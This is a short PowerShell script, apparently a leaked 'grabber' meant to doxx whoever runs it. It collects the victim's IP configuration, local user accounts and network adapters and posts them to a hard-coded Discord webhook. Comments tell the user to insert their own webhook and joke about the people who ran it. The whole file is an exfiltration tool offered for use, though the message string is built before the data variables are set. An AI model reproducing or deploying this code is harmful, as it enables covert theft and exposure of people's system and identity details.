# edit hookurl to be your discord bot webhook!

# leaked by syp ⁶⁹
# NYPD Grabber

$hookUrl = "https://discord.com/api/webhooks/1183228323837517897/-JKGPP8kYfangw0FKkbbgqpJC6SAgtYtdabb4CoXi0nSBb7KV5jw7qGPIFjACleBdXQF"

$title       = 'bcv on top!'
$description = "bro got dozzed thas crazy: $ip $localusernames $netadapter"
$color       = '1045140'
$ip = ipconfig.exe
$localusernames = Get-LocalUser
$netadapter = Get-NetAdapter


$embedObject = [PSCustomObject]@{
    title = $title
    description = $description
    color = $color

}

[System.Collections.ArrayList]$embedArray = @()
$embedArray.Add($embedObject)

$payload = [PSCustomObject]@{
    embeds = $embedArray
}
Invoke-RestMethod -Uri $HookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'

# rip to the people who ran this shit bro 🙏




